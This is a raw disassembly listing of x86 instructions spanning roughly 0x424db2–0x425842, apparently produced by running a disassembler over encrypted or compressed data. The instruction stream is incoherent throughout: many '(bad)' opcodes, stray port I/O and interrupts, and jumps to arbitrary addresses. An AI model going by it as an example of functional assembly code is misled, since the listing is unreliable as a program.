  424db2:	ror    BYTE PTR [ecx],0x7c
  424db5:	neg    ebx
  424db7:	fcmovnbe st,st(5)
  424db9:	test   al,0xa2
  424dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dbc:	mov    dh,0x4d
  424dbe:	xchg   ebx,eax
  424dbf:	loop   0x424dee
  424dc1:	and    ah,BYTE PTR [eax+0x460b9dff]
  424dc7:	aad    0xba
  424dc9:	mov    eax,0x1b0a3bd6
  424dce:	ss (bad) 
  424dd0:	(bad)  
  424dd1:	(bad)  
  424dd2:	lock aad 0x53
  424dd5:	enter  0xa9ce,0x6f
  424dd9:	in     eax,0x23
  424ddb:	pop    ebx
  424ddc:	mov    al,ds:0xa67d77e5
  424de1:	icebp  
  424de2:	cmp    al,BYTE PTR [edx-0xe106ad4]
  424de8:	ja     0x424e0a
  424dea:	pop    ecx
  424deb:	and    DWORD PTR [eax+0x12b175e7],ebp
  424df1:	jecxz  0x424db4
  424df3:	dec    edx
  424df4:	pop    edi
  424df5:	xor    ecx,DWORD PTR [edi+0x8bb20af]
  424dfb:	mov    eax,ds:0xeca20085
  424e00:	jge    0x424e24
  424e02:	sbb    esp,DWORD PTR [edx+0x31]
  424e05:	add    DWORD PTR [eax],edi
  424e07:	ret    0xd8d5
  424e0a:	sbb    esi,DWORD PTR [ecx-0x20]
  424e0d:	inc    ebx
  424e0e:	test   DWORD PTR [edx-0x1c6a4cd5],ebp
  424e14:	add    BYTE PTR [esi],bh
  424e16:	hlt    
  424e17:	push   0xffffff83
  424e19:	(bad)  [eax-0x7e]
  424e1c:	(bad)  
  424e1d:	std    
  424e1e:	adc    BYTE PTR [ebx],al
  424e20:	or     DWORD PTR [esi-0x415da589],ecx
  424e26:	add    ch,ah
  424e28:	shl    cl,0x8c
  424e2b:	push   ebx
  424e2c:	or     al,0xb8
  424e2e:	dec    esp
  424e2f:	ret    
  424e30:	mov    eax,0x95eebb8b
  424e35:	xlat   BYTE PTR ds:[ebx]
  424e36:	addr16 xor eax,0xcf2e6f53
  424e3c:	or     al,0xe9
  424e3e:	push   ebp
  424e3f:	xor    BYTE PTR [edi+edx*4],bl
  424e42:	xchg   DWORD PTR [edi+0x7d7d8455],ebp
  424e48:	dec    ebp
  424e49:	cmp    ecx,DWORD PTR ds:0x1b9e9bf5
  424e4f:	dec    ebp
  424e50:	mov    BYTE PTR ds:0x71458e82,dh
  424e56:	cs inc ecx
  424e58:	sti    
  424e59:	mov    ecx,0x105e0493
  424e5e:	js     0x424de3
  424e60:	push   cs
  424e61:	sar    cl,cl
  424e63:	jne    0x424e83
  424e65:	jg     0x424e55
  424e67:	scas   eax,DWORD PTR es:[edi]
  424e68:	das    
  424e69:	fidivr WORD PTR [edx+0x3]
  424e6c:	(bad)  
  424e6d:	jmp    0x424e6f
	...
  424ed3:	add    BYTE PTR [eax],al
  424ed5:	add    BYTE PTR ds:0xf361d20c,bh
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424f0d
  424ee3:	div    DWORD PTR [esp+ebp*8+0x67]
  424ee7:	mov    WORD PTR [ecx],es
  424ee9:	add    BYTE PTR [eax],al
  424eeb:	add    DWORD PTR [eax],eax
  424eed:	add    dh,bl
  424eef:	xchg   esp,eax
  424ef0:	and    ch,BYTE PTR [edi-0x2b]
  424ef3:	sub    DWORD PTR [ecx-0x358f1a37],edx
  424ef9:	icebp  
  424efa:	mov    eax,0x7dbd3b8b
  424eff:	in     al,0xc8
  424f01:	mov    WORD PTR [ebp+0x59d767a5],fs
  424f07:	int    0xa0
  424f09:	jns    0x424ec1
  424f0b:	ret    
  424f0c:	and    eax,0xcb927c0f
  424f11:	xor    al,0x11
  424f13:	mov    ds:0x5f388204,al
  424f18:	and    BYTE PTR [eax],bl
  424f1a:	cmp    bh,BYTE PTR [ebp+ebp*8-0x6cb4a8ed]
  424f21:	enter  0x4e33,0x5c
  424f25:	or     eax,0xc9877620
  424f2a:	mov    bl,bh
  424f2c:	ja     0x424f08
  424f2e:	in     al,dx
  424f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f30:	test   al,0x99
  424f32:	jo     0x424ef6
  424f34:	fwait
  424f35:	adc    esp,edi
  424f37:	cmp    DWORD PTR ds:0x3e4a64ac,0x39
  424f3e:	or     dl,bl
  424f40:	repnz push ecx
  424f42:	shr    DWORD PTR [edx-0x3e],0xea
  424f46:	sub    eax,0xdd9b98e1
  424f4b:	mov    al,0x9
  424f4d:	mov    edi,0x85d6fc7c
  424f52:	mov    edx,edx
  424f54:	ds pop edi
  424f56:	and    DWORD PTR [ebp+0x0],0xdfc26be
  424f5d:	adc    eax,0x618f66e4
  424f62:	jnp    0x424f06
  424f64:	inc    ebx
  424f65:	mov    ch,0xf
  424f67:	mov    gs,ebx
  424f69:	gs (bad) 
  424f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f6c:	jge    0x424f0f
  424f6e:	int    0x1d
  424f70:	cdq    
  424f71:	mov    eax,ds:0xcf7efc6
  424f76:	retf   0x7fef
  424f79:	int    0x21
  424f7b:	sar    dl,0x50
  424f7e:	add    al,0xf7
  424f80:	popa   
  424f81:	mov    bl,0xe5
  424f83:	adc    DWORD PTR [edi+0x2c507765],ebp
  424f89:	fwait
  424f8a:	mov    esp,0x7d3bda60
  424f8f:	lods   eax,DWORD PTR ds:[esi]
  424f90:	imul   eax,DWORD PTR [edx+0x45c8782f],0xffffffee
  424f97:	adc    dh,cl
  424f99:	pop    es
  424f9a:	mov    dl,0x18
  424f9c:	test   dl,dh
  424f9e:	mov    bh,0x49
  424fa0:	or     eax,0x53ed656a
  424fa5:	ficom  WORD PTR [ecx]
  424fa7:	push   ds
  424fa8:	pop    edi
  424fa9:	push   esi
  424faa:	fmul   st(6),st
  424fac:	sub    cl,0x4d
  424faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fb0:	dec    esi
  424fb1:	add    edi,DWORD PTR [eax+eiz*2+0x14]
  424fb5:	out    0xac,eax
  424fb7:	lods   eax,DWORD PTR ds:[esi]
  424fb8:	mov    ebp,0xfec3da4d
  424fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fbe:	push   ss
  424fbf:	xlat   BYTE PTR ds:[ebx]
  424fc0:	xchg   esi,eax
  424fc1:	jae    0x424f5b
  424fc3:	xor    BYTE PTR [esp+eiz*4],0xfe
  424fc7:	lahf   
  424fc8:	scas   eax,DWORD PTR es:[edi]
  424fc9:	ret    
  424fca:	sbb    BYTE PTR [esi-0x2],ch
  424fcd:	scas   eax,DWORD PTR es:[edi]
  424fce:	ss sbb eax,0x99b1ac3d
  424fd4:	pop    edi
  424fd5:	fisttp WORD PTR [ebx-0x22e1b64]
  424fdb:	fcom   st(2)
  424fdd:	pop    ecx
  424fde:	mov    cl,0xc2
  424fe0:	jns    0x424f9f
  424fe2:	sbb    eax,0x9daf5bee
  424fe7:	xchg   edx,eax
  424fe8:	inc    ebx
  424fe9:	xor    esp,DWORD PTR [ebx+0xebf853]
	...
  425053:	add    BYTE PTR [eax],al
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	mov    cl,0x5
  425064:	push   ebx
  425065:	dec    edi
  425066:	lea    eax,[bx+di]
  425069:	add    BYTE PTR [eax],al
  42506b:	add    DWORD PTR [eax],eax
  42506d:	add    BYTE PTR [eax-0x2a],bl
  425070:	rcr    DWORD PTR [edi-0x97b580c],1
  425076:	inc    esi
  425077:	mov    DWORD PTR [edx],edx
  425079:	adc    eax,0x36fdb5a8
  42507e:	enter  0xd095,0xab
  425082:	or     al,BYTE PTR [ebx+ebx*8+0x2f]
  425086:	rol    esp,1
  425088:	pop    ecx
  425089:	out    0x2a,eax
  42508b:	(bad)  
  42508c:	fsub   DWORD PTR ss:[edx+ebx*4-0x4bc06ee0]
  425094:	clc    
  425095:	mov    ebp,DWORD PTR [ebx]
  425097:	or     edx,esi
  425099:	cmp    BYTE PTR [ebp-0xf],0x6f
  42509d:	push   edi
  42509e:	ins    DWORD PTR es:[edi],dx
  42509f:	js     0x42510e
  4250a1:	dec    eax
  4250a2:	nop
  4250a3:	sahf   
  4250a4:	(bad)  
  4250a5:	pop    ss
  4250a6:	jae    0x425115
  4250a8:	or     al,0x87
  4250aa:	outs   dx,BYTE PTR ds:[esi]
  4250ab:	or     BYTE PTR [edx],bh
  4250ad:	pop    eax
  4250ae:	xchg   DWORD PTR [edi-0x71440949],esi
  4250b4:	(bad)  
  4250b5:	cld    
  4250b6:	adc    al,BYTE PTR [ebx]
  4250b8:	clc    
  4250b9:	pop    ebx
  4250ba:	(bad)  
  4250bb:	push   eax
  4250bc:	cmp    DWORD PTR [edi-0x12d07c72],ebx
  4250c2:	scas   al,BYTE PTR es:[edi]
  4250c3:	mov    esi,0xa3045d0
  4250c8:	(bad)  
  4250c9:	test   al,0x2b
  4250cb:	xor    BYTE PTR [ebx-0x537b958f],bh
  4250d1:	dec    ecx
  4250d2:	pusha  
  4250d3:	out    0x38,eax
  4250d5:	pusha  
  4250d6:	sub    ecx,ebp
  4250d8:	cmp    eax,0xe6d758e1
  4250dd:	pusha  
  4250de:	test   eax,0xd046ad82
  4250e3:	not    DWORD PTR [esi]
  4250e5:	pop    ecx
  4250e6:	dec    edx
  4250e7:	mov    ebp,0x91b4e99e
  4250ec:	lock verw WORD PTR [ebx-0x5]
  4250f1:	popa   
  4250f2:	xchg   DWORD PTR [esi-0x23206531],ebp
  4250f8:	cld    
  4250f9:	and    DWORD PTR [esi+0x2f],0x14
  4250fd:	imul   edi,DWORD PTR [si],0x3d
  425101:	outs   dx,BYTE PTR ds:[esi]
  425102:	mov    ebx,DWORD PTR [esi+0x73]
  425105:	adc    BYTE PTR [ecx],bh
  425107:	xor    eax,0x1cde824
  42510c:	sub    BYTE PTR [ebx+0xc43c00f],cl
  425112:	js     0x425102
  425114:	fmulp  st(7),st
  425116:	adc    DWORD PTR [edx],edi
  425118:	lea    esp,[ecx]
  42511a:	jae    0x425150
  42511c:	push   ecx
  42511d:	div    DWORD PTR [ecx-0x29]
  425120:	inc    ecx
  425121:	mov    ebx,0x3aeb0815
  425126:	js     0x4250fe
  425128:	push   edx
  425129:	fwait
  42512a:	mov    al,0x73
  42512c:	iret   
  42512d:	pop    esi
  42512e:	mov    ah,0x18
  425130:	push   0xffffff8f
  425132:	dec    eax
  425133:	xchg   ebp,eax
  425135:	jl     0x425167
  425137:	out    0x94,eax
  425139:	fidivr WORD PTR [ebp+ebp*1+0x2e]
  42513d:	cmp    BYTE PTR [ecx-0x12],bl
  425140:	out    0x71,al
  425142:	xor    ch,BYTE PTR [ebx+0x4aa49612]
  425148:	dec    eax
  425149:	adc    al,0x89
  42514b:	aaa    
  42514c:	or     al,BYTE PTR [edx]
  42514e:	xchg   ecx,eax
  42514f:	jle    0x425171
  425151:	mov    ebx,0x4bbdeba3
  425156:	pop    edx
  425157:	div    bh
  425159:	and    eax,0x367f8b3
  42515e:	or     BYTE PTR [ebp+ecx*1+0x11be7781],dl
  425165:	or     al,0x2b
  425167:	jg     0x4250f0
  425169:	cmp    cl,BYTE PTR [eax+0x712103]
	...
  4251d3:	add    BYTE PTR [eax],al
  4251d5:	add    dh,bl
  4251d7:	adc    DWORD PTR [edi-0x15020dd],ebx
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0xb028:0x620192e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    BYTE PTR [ecx+0x5e],al
  4251f0:	ret    
  4251f1:	(bad)  
  4251f2:	fmul   QWORD PTR [esi]
  4251f4:	mov    edx,ds
  4251f6:	out    dx,al
  4251f7:	push   0xd
  4251f9:	(bad)  
  4251fa:	nop
  4251fb:	mov    ah,0x64
  4251fd:	mov    DWORD PTR [ebp+0x51],ecx
  425200:	xor    al,0xaa
  425202:	out    dx,al
  425203:	push   ss
  425204:	clc    
  425205:	inc    ebx
  425206:	daa    
  425207:	lahf   
  425208:	xchg   ebp,eax
  425209:	mov    ds:0x150ef40d,eax
  42520e:	jns    0x42519f
  425210:	scas   al,BYTE PTR es:[edi]
  425211:	inc    ebp
  425212:	jle    0x425210
  425214:	xor    DWORD PTR [ebx],ebx
  425216:	jg     0x4251a6
  425218:	xchg   esp,eax
  425219:	or     bh,bl
  42521b:	jo     0x42523c
  42521d:	mov    DWORD PTR [ecx],ebx
  42521f:	shl    ebx,1
  425221:	mov    esp,0x9d06de34
  425226:	push   es
  425227:	iret   
  425228:	mov    edi,0x1ed70dd6
  42522d:	xchg   esp,eax
  42522e:	mul    edx
  425230:	arpl   WORD PTR [esi],bx
  425232:	int    0x14
  425234:	mov    WORD PTR [ebx-0x5e3aa90e],ss
  42523a:	loopne 0x4251d3
  42523c:	push   cs
  42523d:	cmp    bh,BYTE PTR [ebp-0x45]
  425240:	mov    edx,0xb280314d
  425245:	jnp    0x425228
  425247:	xchg   eax,eax
  425249:	aad    0x2a
  42524b:	sub    ch,BYTE PTR [edi]
  42524d:	xchg   esp,eax
  42524e:	inc    BYTE PTR [ebx+0x38219665]
  425254:	ja     0x4252bc
  425256:	add    DWORD PTR [eax],esp
  425258:	xor    DWORD PTR [edi+0x9],ebp
  42525b:	mov    bl,0x4d
  42525d:	imul   eax,DWORD PTR [eax+ecx*4-0x24b466fc],0x11
  425265:	(bad)  
  425266:	and    al,0x2f
  425268:	outs   dx,DWORD PTR ds:[esi]
  425269:	js     0x42529d
  42526b:	xor    edx,DWORD PTR [eax]
  42526d:	repnz les edx,FWORD PTR [ebx]
  425270:	mov    edx,0x473e9992
  425275:	in     eax,0x66
  425277:	and    dh,BYTE PTR [ebp+0x48]
  42527a:	pop    esi
  42527b:	outs   dx,BYTE PTR ds:[esi]
  42527c:	or     al,0x1
  42527e:	mov    ecx,DWORD PTR [edi+0x73e61816]
  425284:	fdivr  DWORD PTR [edi-0x46]
  425287:	add    dh,0x1f
  42528a:	push   ss
  42528b:	sub    eax,0xd1994bf5
  425290:	sub    cl,BYTE PTR [eax+0x22929389]
  425296:	test   eax,0xfdff3570
  42529b:	jo     0x425249
  42529d:	xchg   ebx,eax
  42529e:	popf   
  42529f:	out    dx,eax
  4252a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252a1:	jo     0x4252be
  4252a3:	mov    al,ds:0x2a3404d8
  4252a8:	xchg   cx,ax
  4252aa:	xchg   BYTE PTR [ecx+ecx*8+0x67],dh
  4252ae:	in     eax,dx
  4252af:	leave  
  4252b0:	gs clc 
  4252b2:	imul   ebx,eax,0xfdf47ac8
  4252b8:	push   esp
  4252b9:	dec    ebx
  4252ba:	repz jecxz 0x4252da
  4252bd:	imul   DWORD PTR [edx+0x7c]
  4252c0:	sbb    edi,DWORD PTR [eax+0x7af6d8a8]
  4252c6:	les    ebx,FWORD PTR [esi+edi*2]
  4252c9:	inc    eax
  4252ca:	data16 das 
  4252cc:	sbb    al,0x33
  4252ce:	gs and al,0x43
  4252d1:	int    0xc2
  4252d3:	aam    0xc1
  4252d5:	xchg   ebx,eax
  4252d6:	adc    al,0xad
  4252d8:	sub    ebx,edi
  4252da:	adc    al,0x90
  4252dc:	adc    al,0x11
  4252de:	xor    eax,esp
  4252e0:	jecxz  0x42531d
  4252e2:	xchg   esi,eax
  4252e3:	cmp    BYTE PTR [ecx],0x5f
  4252e6:	out    0x96,al
  4252e8:	sub    cl,BYTE PTR [esi+0x63]
  4252eb:	sbb    al,0xf3
  4252ed:	outs   dx,BYTE PTR ds:[esi]
	...
  425356:	lods   al,BYTE PTR ds:[esi]
  425357:	les    esi,FWORD PTR [ebx-0x32]
  42535a:	jnp    0x42535b
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	cwde   
  425363:	int    0x3e
  425365:	cmp    BYTE PTR [edi-0x71],ah
  425368:	add    DWORD PTR [eax],eax
  42536a:	add    BYTE PTR [ecx],al
  42536c:	add    BYTE PTR [eax],al
  42536e:	cdq    
  42536f:	adc    eax,DWORD PTR [edx+0x13]
  425372:	out    dx,eax
  425373:	call   0xce39:0x86fc51c0
  42537a:	xchg   BYTE PTR [eax],dl
  42537c:	cld    
  42537d:	imul   edx,DWORD PTR [edi-0x1f],0x49a34fcc
  425384:	sub    dl,al
  425386:	clc    
  425387:	adc    ah,cl
  425389:	push   esi
  42538a:	sbb    eax,0x44bb9532
  42538f:	shr    DWORD PTR [ebx+0x59],0xa4
  425393:	fild   WORD PTR [edi-0x255bcd13]
  425399:	loope  0x425364
  42539b:	call   0xf5a7e5a0
  4253a0:	xchg   esi,eax
  4253a1:	arpl   WORD PTR [ebx+0x63],cx
  4253a4:	inc    edi
  4253a5:	inc    edx
  4253a6:	fstp   TBYTE PTR [ecx+edi*4-0x57ae7e14]
  4253ad:	lods   al,BYTE PTR ds:[esi]
  4253ae:	mov    DWORD PTR [ebp-0x3e],0x29f69a78
  4253b5:	pop    edx
  4253b6:	scas   al,BYTE PTR es:[edi]
  4253b7:	push   0xffffffec
  4253b9:	xchg   ebp,eax
  4253ba:	inc    ebx
  4253bb:	cmp    ecx,DWORD PTR [edx+edx*8]
  4253be:	cmp    eax,0xb9de29b3
  4253c3:	popa   
  4253c4:	jne    0x425425
  4253c6:	dec    ecx
  4253c7:	lock or cl,BYTE PTR ss:[esi-0x11e47058]
  4253cf:	cvttps2pi mm2,QWORD PTR [edx-0x230f8084]
  4253d6:	in     eax,0x2a
  4253d8:	push   ecx
  4253d9:	cs aaa 
  4253db:	mov    cl,BYTE PTR [eiz*4+0x7c19596a]
  4253e2:	xchg   edi,eax
  4253e3:	mov    esi,0x2d9ae34a
  4253e8:	mov    ds:0x63344f04,al
  4253ed:	and    eax,0x40f74b7b
  4253f2:	add    dl,BYTE PTR [edx+0x338ce2aa]
  4253f8:	inc    edx
  4253f9:	(bad)  
  4253fa:	mov    DWORD PTR ds:[ebx],esp
  4253fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253fe:	pop    edi
  4253ff:	xchg   esi,eax
  425400:	and    al,0x4
  425402:	mov    bl,0x59
  425404:	ret    
  425405:	imul   edi,DWORD PTR [eax],0x6a59f2be
  42540b:	(bad)  
  42540c:	mov    edi,0x189c0ee3
  425411:	cmp    al,BYTE PTR [ebx+0x71]
  425414:	jb     0x425400
  425416:	add    dl,BYTE PTR [eax]
  425418:	mov    WORD PTR [ebx-0x6c944126],?
  42541e:	inc    eax
  42541f:	imul   esp,DWORD PTR [esi],0x797b7777
  425425:	imul   DWORD PTR [edi]
  425427:	sbb    eax,0xad0a0d13
  42542c:	stos   DWORD PTR es:[edi],eax
  42542d:	xor    ax,0x9cac
  425431:	ins    DWORD PTR es:[edi],dx
  425432:	hlt    
  425433:	popf   
  425434:	jns    0x425422
  425436:	sub    ebx,DWORD PTR [esp+ecx*8+0x77eae9b5]
  42543d:	xlat   BYTE PTR ds:[ebx]
  42543e:	shl    BYTE PTR [edi+0x55921a9c],0xc9
  425445:	cld    
  425446:	jge    0x42549d
  425448:	cmp    ebx,DWORD PTR [ecx]
  42544a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42544b:	push   ds
  42544c:	jno    0x425462
  42544e:	push   ds
  42544f:	mov    ds:0x2e2bfe39,al
  425454:	ja     0x4253f1
  425456:	and    dl,dh
  425458:	pop    es
  425459:	inc    edi
  42545a:	mov    edi,0x74a30c23
  42545f:	(bad)  
  425460:	sub    esi,DWORD PTR ss:[edi]
  425463:	ret    0xd36c
  425466:	mov    cl,0xc3
  425468:	jecxz  0x42547e
  42546a:	dec    ebp
  42546b:	sbb    bl,BYTE PTR [edi]
  42546d:	add    BYTE PTR ss:[eax],al
	...
  4254d4:	add    BYTE PTR [eax],al
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    edx,DWORD PTR [ebx+0x672072cf]
  4254e7:	nop
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	adc    DWORD PTR [edx-0x65],edx
  4254f1:	cmp    eax,0x139342c0
  4254f6:	mov    WORD PTR cs:[eax+0x440f8ff2],ss
  4254fd:	fcomp  DWORD PTR [ebx+0x41fd8c26]
  425503:	mov    ?,WORD PTR ds:0xe386201a
  425509:	push   ss
  42550a:	push   cs
  42550b:	mov    esi,0x62c0ef27
  425510:	or     eax,0xf7add1e0
  425515:	jnp    0x42558f
  425517:	or     DWORD PTR [edx],edx
  425519:	fcom   DWORD PTR [eax]
  42551b:	fwait
  42551c:	add    al,0x43
  42551e:	(bad)
  425521:	clc    
  425522:	mov    ecx,0x202a337f
  425527:	int    0xed
  425529:	push   ecx
  42552a:	mov    edi,0x89cf1970
  42552f:	inc    edi
  425530:	adc    al,0x22
  425532:	jbe    0x4255ae
  425534:	push   ss
  425535:	xchg   ebp,eax
  425536:	pop    esp
  425537:	dec    edi
  425538:	outs   dx,DWORD PTR ds:[esi]
  425539:	sub    DWORD PTR [edx-0x97ebff7],esp
  42553f:	dec    edi
  425540:	xchg   ecx,eax
  425541:	addr16 and eax,0x2412b6b5
  425547:	loopne 0x4255a9
  425549:	and    al,0xdc
  42554b:	test   BYTE PTR [esi+0x49],ah
  42554e:	pop    ebx
  42554f:	adc    DWORD PTR [ebp-0x6490d09a],ebp
  425555:	ins    DWORD PTR es:[edi],dx
  425556:	cld    
  425557:	fs push edx
  425559:	xchg   ebp,eax
  42555a:	sbb    eax,0x4e60bf49
  42555f:	stc    
  425560:	or     ebp,ebx
  425562:	pushf  
  425563:	ds push esi
  425565:	inc    BYTE PTR [ecx+0x645ca219]
  42556b:	sub    ch,dl
  42556d:	les    ecx,FWORD PTR [edi+0x73]
  425570:	inc    esi
  425571:	or     al,0x72
  425573:	mov    edi,fs
  425575:	inc    ecx
  425576:	test   al,0x39
  425578:	ret    
  425579:	ins    DWORD PTR es:[edi],dx
  42557a:	xor    al,0x66
  42557c:	push   0x173e9d09
  425581:	xor    esp,ecx
  425583:	retf   
  425584:	add    ah,dh
  425586:	repz add al,0x7e
  425589:	(bad)  
  42558b:	pop    ecx
  42558c:	xchg   esp,eax
  42558d:	push   ds
  42558e:	ja     0x42559c
  425590:	inc    ebx
  425591:	in     al,0x98
  425593:	or     bh,BYTE PTR [eax]
  425595:	sub    BYTE PTR [ebx+ebx*2-0x6831623c],bl
  42559c:	cwde   
  42559d:	pop    ecx
  42559e:	ror    BYTE PTR [edi],0x1b
  4255a1:	arpl   WORD PTR [esi+eiz*1-0x73],si
  4255a5:	out    dx,eax
  4255a6:	cwde   
  4255a7:	mov    al,ds:0xaf7362ec
  4255ac:	push   esi
  4255ad:	int    0x22
  4255af:	xor    BYTE PTR [ecx-0x60],bh
  4255b2:	or     ecx,DWORD PTR [eax+0x537c9543]
  4255b8:	dec    ecx
  4255b9:	pop    esp
  4255ba:	outs   dx,BYTE PTR ds:[esi]
  4255bb:	jmp    0x31681193
  4255c0:	pushf  
  4255c1:	(bad)  
  4255c2:	mul    ecx
  4255c4:	sahf   
  4255c5:	loope  0x4255c0
  4255c7:	inc    edx
  4255c8:	cmp    al,0x76
  4255ca:	pop    ebp
  4255cb:	push   0xffffffd1
  4255cd:	push   esi
  4255ce:	enter  0x69a1,0x35
  4255d2:	popa   
  4255d3:	outs   dx,DWORD PTR ds:[esi]
  4255d4:	xor    eax,0x75934d4c
  4255d9:	cmp    cl,BYTE PTR [ecx]
  4255db:	dec    esi
  4255dc:	mov    eax,ds:0x2a80dc26
  4255e1:	and    esi,DWORD PTR [eax+0x3d]
  4255e4:	xchg   ebx,eax
  4255e5:	adc    cl,BYTE PTR [esp+eax*1-0x1ba1b435]
  4255ec:	xchg   esi,edx
	...
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0x5c2f13a
  425664:	loop   0x42562e
  425666:	addr16 xchg ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	(bad)  
  42566f:	xchg   edi,eax
  425670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425671:	loop   0x42565b
  425673:	or     bl,cl
  425675:	in     al,0xf7
  425677:	xchg   BYTE PTR [edi-0x776bbbd5],al
  42567d:	jbe    0x42563a
  42567f:	mov    ebp,esi
  425681:	fwait
  425682:	aaa    
  425683:	retf   
  425684:	mov    edx,DWORD PTR [ecx]
  425686:	inc    edi
  425687:	imul   esp,DWORD PTR [ebx-0x5e6f2225],0x24
  42568e:	(bad)  
  42568f:	jno    0x42570d
  425691:	or     al,0xc7
  425694:	push   ebx
  425695:	cmp    ecx,0xc8a57154
  42569b:	sbb    BYTE PTR [ecx+0x6254d571],dh
  4256a1:	dec    edx
  4256a2:	dec    eax
  4256a3:	inc    esi
  4256a4:	cmc    
  4256a5:	mov    ebp,0x4e7f85f7
  4256aa:	outs   dx,DWORD PTR ds:[esi]
  4256ab:	enter  0x3734,0xa2
  4256af:	jp     0x425684
  4256b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256b2:	sbb    eax,0x12df70ca
  4256b7:	jecxz  0x4256cb
  4256b9:	mov    ebp,0xa956df86
  4256be:	sti    
  4256bf:	js     0x425667
  4256c1:	inc    ecx
  4256c2:	retf   0x1777
  4256c5:	sub    ebp,DWORD PTR [edi+ebx*8-0x4cb155f8]
  4256cc:	xor    BYTE PTR [ebx-0x4b0f9a3e],0x25
  4256d3:	push   0xe6c18769
  4256d8:	rol    BYTE PTR [esi+0x68],0xb3
  4256dc:	aas    
  4256dd:	jne    0x42566c
  4256df:	inc    eax
  4256e0:	and    BYTE PTR fs:[edi+ecx*8-0x15],ah
  4256e5:	test   eax,0x86d948f8
  4256ea:	push   0x7e
  4256ec:	pop    edi
  4256ed:	fucomi st,st(2)
  4256ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256f0:	fstp   DWORD PTR ds:0xf38fd190
  4256f6:	or     al,0x42
  4256f8:	sub    al,0xae
  4256fa:	sub    al,0x29
  4256fc:	add    al,0x51
  4256fe:	fnstcw WORD PTR [ecx-0x4d91036f]
  425704:	adc    BYTE PTR [esi-0x7d641da9],0x94
  42570b:	out    dx,eax
  42570c:	fwait
  42570d:	push   esi
  42570e:	jecxz  0x4256c2
  425710:	pushf  
  425711:	dec    edi
  425712:	push   esi
  425713:	(bad)  
  425714:	std    
  425715:	cdq    
  425716:	aam    0xc0
  425718:	(bad)  
  425719:	out    0x18,eax
  42571b:	test   al,0x0
  42571d:	dec    ecx
  42571e:	mov    al,cl
  425720:	rcr    BYTE PTR [esi-0x3a27bd2],cl
  425726:	mov    gs,WORD PTR [edx-0x2345ce2f]
  42572c:	jno    0x4256b4
  42572e:	fnstenv [esi]
  425730:	gs lock pop ebp
  425733:	mov    ecx,0xc33758ba
  425738:	aam    0x3f
  42573a:	jl     0x425782
  42573c:	xchg   edi,eax
  42573d:	repnz sub BYTE PTR fs:[esi-0x1c2d19fd],cl
  425745:	mov    edi,0xfdac2ee3
  42574a:	(bad)  
  42574b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42574c:	scas   eax,DWORD PTR es:[edi]
  42574d:	in     eax,0x2b
  42574f:	xchg   DWORD PTR [ecx-0x28],edx
  425752:	cld    
  425753:	out    dx,eax
  425754:	and    DWORD PTR [eax+0x718fccff],0xffffffb8
  42575b:	repnz les eax,FWORD PTR [ebp-0x10]
  42575f:	cli    
  425760:	int3   
  425761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425762:	dec    ebp
  425763:	popf   
  425764:	push   eax
  425765:	and    DWORD PTR [eax+0x3983c73f],ebp
  42576b:	and    DWORD PTR [ecx],0x99
	...
  4257d5:	add    dh,dl
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0xf0c66774
  4257e5:	daa    
  4257e6:	addr16 xchg edx,eax
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	add    dl,BYTE PTR [ebx-0x2e2ac0a]
  4257f4:	mov    dh,0xfb
  4257f6:	jne    0x425785
  4257f8:	jl     0x425857
  4257fa:	test   cl,dl
  4257fc:	int3   
  4257fd:	into   
  4257fe:	jl     0x4257e2
  425800:	xor    edx,DWORD PTR [esi]
  425802:	sub    eax,0x83ed69dd
  425807:	cmp    al,0xe8
  425809:	or     eax,0x238fb345
  42580e:	inc    edx
  42580f:	mov    edi,0xe7d936e7
  425814:	stos   BYTE PTR es:[edi],al
  425815:	lea    ebp,[edi]
  425817:	mov    eax,0xb1558912
  42581c:	repz xchg ebp,eax
  42581e:	sbb    DWORD PTR [esi-0x4348957f],ecx
  425824:	std    
  425825:	add    DWORD PTR [ebp+ebp*1-0x419e7b9d],ebx
  42582c:	lahf   
  42582d:	(bad)
  425830:	adc    dh,bl
  425832:	inc    esp
  425833:	xor    BYTE PTR [esi+edx*4-0x62],0xe6
  425838:	and    BYTE PTR [esi-0xba54d64],ah
  42583e:	addr16 push es
  425840:	mov    dh,0x91
  425842:	xchg   ebp,eax
